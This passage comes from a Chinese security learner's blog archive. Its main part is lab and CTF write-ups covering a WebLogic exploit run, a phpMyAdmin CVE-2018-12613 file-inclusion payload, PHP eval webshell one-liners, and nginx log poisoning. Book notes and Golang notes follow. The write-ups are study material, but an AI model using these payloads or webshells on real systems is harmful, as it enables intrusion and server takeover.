src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210614225155048.png"></p><ol start="3"><li>使用MSF设置监听，然后使用下面的</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py http://IP:PORT/_async/AsyncResponseServiceHttps</span><br></pre></td></tr></table></figure><p>然后就</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210615004348045.png"></p><p>这里我就先不纠结了，直接允许算了，他们都说用上面的那个终极反序列化利用工具能过360，但是终究是我的Java环境不行，这里当一次物理黑客，直接退出360(真的把我搞得没辙了，可见360还是有一些用的嘤嘤嘤)。本来呢，360没法过的话是绝对进不了Web服务器的，看来有空是时候要学点免杀的技巧了。</p><p><strong>再次宕机，过一年再回头看，最近一年都不会再搞这套靶机了，能力暂时不支持</strong></p><h2 id="红日安全靶场-lt-03-ATT-amp-CK红队评估-gt"><a href="#红日安全靶场-lt-03-ATT-amp-CK红队评估-gt" class="headerlink" title="红日安全靶场&lt;03 ATT&amp;CK红队评估&gt;"></a>红日安全靶场&lt;03 ATT&amp;CK红队评估&gt;</h2><h3 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h3><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/"><strong>ATT&amp;CK3地址</strong></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">基本信息</span><br><span class="line"></span><br><span class="line">作者：licong</span><br><span class="line"></span><br><span class="line">环境配置</span><br><span class="line"></span><br><span class="line">打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</span><br><span class="line"></span><br><span class="line">挂起状态，账号已默认登陆，centos为出网机，第一次运行，需重新获取桥接模式网卡ip。</span><br><span class="line"></span><br><span class="line">除重新获取ip，不建议进行任何虚拟机操作。</span><br><span class="line"></span><br><span class="line">参考虚拟机网络配置，添加新的网络，该网络作为内部网络。</span><br><span class="line"></span><br><span class="line">注：名称及网段必须符合上述图片，进行了固定ip配置。</span><br><span class="line"></span><br><span class="line">描述</span><br><span class="line"></span><br><span class="line">目标：域控中存在一份重要文件。</span><br><span class="line"></span><br><span class="line">本次环境为黑盒测试，不提供虚拟机账号密码。</span><br></pre></td></tr></table></figure><p>这套环境的主机又太多了，我的电脑带起来实在是很吃力，往后这种主机较多的靶机估计是打不了了，只能打打主机不超过三台的小环境了，当然根据少就是多的原则，一定会将小环境利用到极致的。</p><h2 id="红日安全靶场-lt-04-ATT-amp-CK红队评估-gt"><a href="#红日安全靶场-lt-04-ATT-amp-CK红队评估-gt" class="headerlink" title="红日安全靶场&lt;04 ATT&amp;CK红队评估&gt;"></a>红日安全靶场&lt;04 ATT&amp;CK红队评估&gt;</h2><h3 id="一、环境介绍"><a href="#一、环境介绍" class="headerlink" title="一、环境介绍"></a>一、环境介绍</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">大家好红日安全红队靶场（四）已经出来，本次靶场渗透反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透等多种组合漏洞，希望大家多多利用。</span><br><span class="line">红队评估四靶场描述</span><br><span class="line">第一次搭建靶机，如有啥不足或问题，欢迎各位师傅在vlunstack微信群里提出，向师傅们学习</span><br><span class="line">其它靶场下载地址</span><br><span class="line">    红队评估一：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</span><br><span class="line">    红队评估二：http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</span><br><span class="line">    红队评估三：http://vulnstack.qiyuanxuetang.net/vuln/detail/5/</span><br><span class="line">    Web安全靶场下载：http://vulnstack.qiyuanxuetang.net/vuln/detail/4/</span><br><span class="line"></span><br><span class="line">靶场学习路径，可参考</span><br><span class="line">    st漏洞利用</span><br><span class="line">    phpmyadmin getshell</span><br><span class="line">    tomcat 漏洞利用</span><br><span class="line">    docker逃逸</span><br><span class="line">    ms14-068</span><br><span class="line">    ssh密钥利用</span><br><span class="line">    流量转发</span><br><span class="line">    历史命令信息泄露</span><br><span class="line">    域渗透</span><br><span class="line">环境说明</span><br><span class="line"></span><br><span class="line">机器密码</span><br><span class="line">    ubuntu:ubuntu</span><br><span class="line">    域成员机器:</span><br><span class="line">    douser:Dotest123</span><br><span class="line">    DC:</span><br><span class="line">    administrator:Test2008</span><br></pre></td></tr></table></figure><p>这次的环境感觉挺少的，可以打一打试一试的。</p><p>值得一提的是域控DC主机的密码是需要改一下的，我将域控主机的密码改为了<code>admin@123</code>。</p><h3 id="二、网络配置"><a href="#二、网络配置" class="headerlink" title="二、网络配置"></a>二、网络配置</h3><p>除了第一、二个靶机好像后面的都没有再放出来网络拓补图了，但是我已经会配了嘿嘿，已经不需要了。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210621224734999.png"></p><p>内网网络的IP地址段为<code>10.10.10.0/24</code>。</p><p>外网模拟的网段为<code>192.168.10.0/24</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机(kali)        :  192.168.10.128(外网)</span><br><span class="line">受害机(ubuntu)      :  192.168.10.136(外网)、10.10.10.132(内网)</span><br><span class="line">域控DC(Server 2008) :  10.10.10.133(内网)</span><br><span class="line">Windows 7   :  10.10.10.130(内网)</span><br></pre></td></tr></table></figure><p>域控机的ipv4方案要调成自动获取ip才可。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210622105055779.png"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210621230506323.png"></p><p>能实现Ubuntu可以ping通Kali即可。</p><p>但是我们重启ubuntu之后所有的docker服务似乎都下线了，这就需要我们再重启一下了，这里因为我没记开始的服务所用到的端口，索性每次就开一个web服务，一个一个地去getshell。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210622120132257.png"></p><h3 id="三、phpmyadmin-getshell"><a href="#三、phpmyadmin-getshell" class="headerlink" title="三、phpmyadmin getshell"></a>三、phpmyadmin getshell</h3><p>参考靶机服务的命名，用的就是这个洞<code>CVE-2018-12613</code>。</p><p>各个环境的版本信息</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210622120439658.png"></p><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><ol><li>phpmyadmin版本4.8.0、4.8.1</li><li>必须能进入phpmyadmin，也就是说要有用户名与密码。</li></ol><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>查看能不能实现include</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http://192.168.10.136:2003/index.php?target=db_sql.php%253f/../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210622123420161.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php phpinfo();?&gt;&quot;;</span><br></pre></td></tr></table></figure><p>然后有这个的话就简单了，直接先在sql查询的那里面执行一下上面的语句，执行之前看看自己的cookie，phpmyadmin对应的值就是php的session文件的文件名，回头直接包含这个恶意session文件即可。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210622124039589.png"></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210622124423732.png"></p><h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><p>getshell也简单了，做个蚁剑的马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT &quot;&lt;?php highlight_file(__FILE__); @eval($_POST[&#x27;c&#x27;]);?&gt;&quot;;</span><br><span class="line"></span><br><span class="line">SELECT `&lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);?&gt;`;</span><br></pre></td></tr></table></figure><p>暂时遇到点问题，不打了先。</p><h1 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h1><h2 id="Webug-4-0"><a href="#Webug-4-0" class="headerlink" title="Webug 4.0"></a>Webug 4.0</h2><h3 id="零、环境介绍"><a href="#零、环境介绍" class="headerlink" title="零、环境介绍"></a>零、环境介绍</h3><h1 id="BUUOJ——Basic"><a href="#BUUOJ——Basic" class="headerlink" title="BUUOJ——Basic"></a>BUUOJ——Basic</h1><h2 id="一、BUU-LFI-COURSE-1"><a href="#一、BUU-LFI-COURSE-1" class="headerlink" title="一、BUU LFI COURSE 1"></a>一、BUU LFI COURSE 1</h2><p><strong>什么是php的LFI</strong></p><blockquote><p>首先谈到lfi就要先知道常见的文件包含所需要有的函数，下面是一些常见的(<strong>注意:LFI是php所特有的应该是，就目前所学来看</strong>)</p><ol><li><p>include() &#x2F;&#x2F;包含一些html模块文件</p></li><li><p>require() &#x2F;&#x2F;包含一些数据库,配置文件</p></li><li><p>include_once()   &#x2F;&#x2F;只调用一次包含文件,多次调用就会报错</p></li><li><p>require_once()</p></li></ol><p>当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，<strong>也都将作为PHP代码执行</strong>。</p><p><strong>include与require的区别在于:</strong></p><ol><li><p>include是当代码执行到它所在的行数是,它才会开始包含文件,并且如果文件加载错误,依然会向下执行代码。</p></li><li><p>require是只要当前程序执行它就会立刻包含文件,并且在加载文件错误的时候会停止运行并发出警告。</p></li></ol></blockquote><p>然后就是甚么是LFI了，刚开始打CTF的时候看到wp中所写的lfi，还是有点不知所然的。但是了解了一下知道原来就是简单的文件包含而已。。</p><blockquote><p><strong>文件包含漏洞的类型分为:</strong></p><ol><li>本地文件包含(LFI)</li><li>远程文件包含(RFI)</li></ol><p>当<strong>php.ini</strong>中，设置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;allow_url_include = On</span><br><span class="line">&gt;allow_url_fopen = On</span><br></pre></td></tr></table></figure><p>即可<strong>执行远程代码</strong>。</p></blockquote><p>然后就是说到这个本地文件包含了，这个在真实的渗透测试(黑盒)的过程中通常是十分难以发现的，因为条件十分的苛刻。首先后端的整体框架是要使用php的，然后又要判断到底是哪里可能是由文件包含常用的那几个函数，而且最重要的是，这个函数的参数对于我们来说必须是可控的，而这对于黑盒测试简直就是不可能的，所以一般使用LFI的时候面向的测试对象一般是需要白盒的。也就是LFI一般是白盒代码审计的时候会见得到，其他情况下是很少见的。</p><p>下面是zhao老师给出的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * User: jinzhao</span></span><br><span class="line"><span class="comment"> * Date: 2019/7/9</span></span><br><span class="line"><span class="comment"> * Time: 7:07 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的意思就是获得一个文件并且包含这个文件。这里的<code>$str</code>变量看似并没有使用上。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210621140837246.png"></p><p>这里因为会将里面包含的文件的内容当成html文件，所以我们包含flag文件的时候应该是直接可以输出flag的。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210621140948098.png"></p><p>当然获得flag并不是我们渗透测试的主要目的，这种最多算是个任意问价读取，还是要看看如何getshell。这里采取包含日志文件，在日志文件里面请求头里面插入恶意代码。</p><p>这里针对nginx这种专门的中间件可以包含下面的文件来getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;包含日志文件</span><br><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210621141916984.png"></p><p><strong>值得一提的是这里包含的access.log文件并不会包含到post的内容，只会包含请求的资源以及UA头。但是这对于我们getshell已经是够得不能再够了。</strong></p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210621141735484.png"></p><p>可以看到浏览器自动高亮了，也就是说这里已经是可以执行了的。直接连上蚁剑获得该终端。</p><p><img src="/2021/06/03/WEB%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A//image-20210621142213571.png"></p><p>本来上线之后第一件事就是想着要练练提权的，但是一看啥环境都没有，直接放弃了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/tmp) $ ls /bin</span><br><span class="line">arch</span><br><span class="line">ash</span><br><span class="line">base64</span><br><span class="line">bbconfig</span><br><span class="line">busybox</span><br><span class="line">cat</span><br><span class="line">chgrp</span><br><span class="line">chmod</span><br><span class="line">chown</span><br><span class="line">conspy</span><br><span class="line">cp</span><br><span class="line">date</span><br><span class="line">dd</span><br><span class="line">df</span><br><span class="line">dmesg</span><br><span class="line">dnsdomainname</span><br><span class="line">dumpkmap</span><br><span class="line">echo</span><br><span class="line">ed</span><br><span class="line">egrep</span><br><span class="line">false</span><br><span class="line">fatattr</span><br><span class="line">fdflush</span><br><span class="line">fgrep</span><br><span class="line">fsync</span><br><span class="line">getopt</span><br><span class="line">grep</span><br><span class="line">gunzip</span><br><span class="line">gzip</span><br><span class="line">hostname</span><br><span class="line">ionice</span><br><span class="line">iostat</span><br><span class="line">ipcalc</span><br><span class="line">kbd_mode</span><br><span class="line">kill</span><br><span class="line">link</span><br><span class="line">linux32</span><br><span class="line">linux64</span><br><span class="line">ln</span><br><span class="line">login</span><br><span class="line">ls</span><br><span class="line">lzop</span><br><span class="line">makemime</span><br><span class="line">mkdir</span><br><span class="line">mknod</span><br><span class="line">mktemp</span><br><span class="line">more</span><br><span class="line">mount</span><br><span class="line">mountpoint</span><br><span class="line">mpstat</span><br><span class="line">mv</span><br><span class="line">netstat</span><br><span class="line">nice</span><br><span class="line">pidof</span><br><span class="line">ping</span><br><span class="line">ping6</span><br><span class="line">pipe_progress</span><br><span class="line">printenv</span><br><span class="line">ps</span><br><span class="line">pwd</span><br><span class="line">reformime</span><br><span class="line">rev</span><br><span class="line">rm</span><br><span class="line">rmdir</span><br><span class="line">run-parts</span><br><span class="line">sed</span><br><span class="line">setpriv</span><br><span class="line">setserial</span><br><span class="line">sh</span><br><span class="line">sleep</span><br><span class="line">stat</span><br><span class="line">stty</span><br><span class="line">su</span><br><span class="line">sync</span><br><span class="line">tar</span><br><span class="line">touch</span><br><span class="line">true</span><br><span class="line">umount</span><br><span class="line">uname</span><br><span class="line">usleep</span><br><span class="line">watch</span><br><span class="line">zcat</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>读书笔记总篇</title>
      <link href="/2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/"/>
      <url>/2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="技术类书籍"><a href="#技术类书籍" class="headerlink" title="技术类书籍"></a>技术类书籍</h1><p>技术类没怎么看过书，一般都是看大师傅们的博客来学习。</p><h1 id="小说类书籍"><a href="#小说类书籍" class="headerlink" title="小说类书籍"></a>小说类书籍</h1><h2 id="2021年"><a href="#2021年" class="headerlink" title="2021年"></a>2021年</h2><h3 id="文城-——余华"><a href="#文城-——余华" class="headerlink" title="文城  ——余华"></a>文城  ——余华</h3><ol><li>第一次读<code>2021年8月1日 — 2021年8月2日</code></li></ol><p><img src="/2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87//image-20210802225140518.png"></p><p>​感觉整篇小说应该算是悲剧吧，非专业的角度说，因为我喜欢的角色都死了，男女主角就是林祥福跟小美吧，也许是先入为主，我总感觉小美跟林祥福最配，后面写的补的内容更详细地站在了小美的角度讲述的故事让人更伤感了，还好我读的快，只用了四个小时左右的时间看完了整本书，到后面越来越快，补的那些内容我只用了一个小时左右的时间。</p><p>​讲的故事呢，也很生动。像我这种读网络小说的屌丝看着都不费劲，比一些故意把文章写得晦涩难懂的好得多，嘿嘿。全篇文章描述最多的女性角色小美感觉特别好，真的特别好。</p><p>​我也不会总结，也不会记录，索性就把现在想到的内容写下来就算了。</p><blockquote><p>车轮的声响远去时，田氏兄弟说话的声音也在远去，他们计算着日子，要在正月初一前把大哥和少爷送回家中。</p></blockquote><p>最后林祥福死后棺材经过小美与阿强埋身的地方更让人觉得难以呼吸。。。</p><h3 id="许三观卖血记-——余华"><a href="#许三观卖血记-——余华" class="headerlink" title="许三观卖血记 ——余华"></a>许三观卖血记 ——余华</h3><ol><li>第一次读完<code>2021年8月20日 00点31分</code></li></ol><p><img src="/2021/06/01/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E6%80%BB%E7%AF%87//image-20210820002314269.png"></p><p>许三观卖血娶媳妇、养孩子、救急，凡是卖过血之后都要吃爆炒猪肝、二两黄酒(黄酒要温一温)，说实话我看不太懂，也没看到什么精髓的地方，纯粹是感觉文章写的还算有趣读下去的，我没什么深度。最膈应人的是到最后我也没弄清楚一乐到底是不是许三观的儿子。许三观很善良，就像之前读的文城中的林祥福一样的善良，也许是一样而非一种的善良，但都散发着人性的光辉，让人觉得可怜，触及人的同理心。不会总结，到此为止。许玉兰与许三观也算是”佳偶天成”。这篇文章的结局好过文城，文城读着太让人压抑。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE复现总刊</title>
      <link href="/2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/"/>
      <url>/2021/06/01/CVE%E5%A4%8D%E7%8E%B0%E6%80%BB%E5%88%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复现一些近年来的cve学习一下</p><h1 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h1><h2 id="PHPMYADMIN-CVE-2018-12613"><a href="#PHPMYADMIN-CVE-2018-12613" class="headerlink" title="[PHPMYADMIN]CVE-2018-12613"></a>[PHPMYADMIN]CVE-2018-12613</h2><p><strong>TAG: 文件包含漏洞、PhpMyAdmin写入Shell</strong></p><p>因为phpmyadmin本身也是用php来写的，所以php的一些漏洞在phpmyadmin里面也是可能出现的，这里就是一个简单的文件包含漏洞。</p><blockquote><p>一个攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。</p><p>该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确的测试。</p><p>攻击者必须经过身份验证，但在这些情况下除外：</p><ul><li>$ cfg [‘AllowArbitraryServer’] &#x3D; true：攻击者可以指定他&#x2F;她已经控制的任何主机，并在phpMyAdmin上执行任意代码</li><li>$ cfg [‘ServerDefault’] &#x3D; 0：这会绕过登录并在没有任何身份验证的情况下运行易受攻击的代码</li></ul></blockquote><p>就是说只要你可以登录这个版本的phpmyadmin的话，就都可以实现任意代码执行。下面看一下审计代码的过程。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>phpMyAdmin 4.8.0和4.8.1</p>]]></content>
      
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang学习笔记</title>
      <link href="/2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/05/30/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0//image-20210530234831511.png"></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着技术的发展，好像说python越来越力不从心了。虽然python的语言格式十分简洁，代码也容易理解，本来我想做一个pythonista的来着，但是看群里都在讨论go语言这种新技术(对于我来说是新技术)，就想了解了解学一下看看go语言的优缺，看哪门语言更适合作为工具语言(语言被开发出来就是作为工具要用的)。PS：其实是总是听说go语言比python好(个人感觉就是好像在瞎吹一样)，想来看看到底好在哪里。</p><p><strong>主要在最近学习python开发之余学一学golang，现在的我也还没资格深入进去</strong></p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>直接下个GoLand就行了，sdk这个ide会自己给你安装好的，也省得配置环境了，到现在为止还没有发现什么错误。社区版的应该就足够一般化的使用了。</p><h2 id="Go-是编译型语言"><a href="#Go-是编译型语言" class="headerlink" title="Go 是编译型语言"></a>Go 是编译型语言</h2><p>Go 使用编译器来编译代码。编译器将源代码编译成二进制（或字节码）格式；在编译代码时，编译器检查错误、优化性能并输出可在不同平台上运行的二进制文件。要创建并运行 Go 程序，程序员必须执行如下步骤。</p><ol><li>使用文本编辑器创建 Go 程序；</li><li>保存文件；</li><li>编译程序；</li><li>运行编译得到的可执行文件。</li></ol><p>这不同于 Python、Ruby 和 JavaScript 等语言，它们不包含编译步骤。Go 自带了编译器，因此无须单独安装编译器。</p><h2 id="Go特点"><a href="#Go特点" class="headerlink" title="Go特点"></a>Go特点</h2><p>快速编译，高效执行，易于开发。</p><p>Go语言支持交叉编译，比如说你可以在运行 Linux 系统的计算机上开发可以在 Windows 上运行的应用程序。这是第一门完全支持 UTF-8 的编程语言，这不仅体现在它可以处理使用 UTF-8 编码的字符串，就连它的源码文件格式都是使用的 UTF-8 编码。Go语言做到了真正的国际化！</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h2 id="Go语言中的变量"><a href="#Go语言中的变量" class="headerlink" title="Go语言中的变量"></a>Go语言中的变量</h2><h3 id="空值"><a href="#空值" class="headerlink" title="空值"></a>空值</h3><p>布尔类型：false</p><p>int类型  ：0</p><p>string类型：””</p><p>其他类型：nil</p><p>这里的其他类型官方文档给的解释是<code>Type must be a pointer, channel, func, interface, map, or slice type</code>。</p><p>也就是说必须是这六种类型<code>pointer, channel, func, interface, map, slice</code></p><h3 id="变量的声明"><a href="#变量的声明" class="headerlink" title="变量的声明"></a>变量的声明</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i <span class="type">int</span></span><br><span class="line">    <span class="keyword">var</span> f <span class="type">float64</span></span><br><span class="line">    <span class="keyword">var</span> b <span class="type">bool</span></span><br><span class="line">    <span class="keyword">var</span> s <span class="type">string</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;%v %v %v %q\n&quot;</span>, i, f, b, s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>声明方式有下面的两种，即</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value1 <span class="keyword">type</span> = value2  或   <span class="keyword">var</span> value1 = value2</span><br><span class="line">value1 := value2</span><br></pre></td></tr></table></figure><p>但是上面的语句都是声明语句，在变量的生存周期内，变量只能被声明一次，这时只能用赋值操作<code>=</code>来改变变量的值，千万不要以为<code>:=</code>是赋值语句，这个只是一个简写的声明语句而已。</p>]]></content>
      
      
      
        <tags>
            
            <tag> GoLang </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
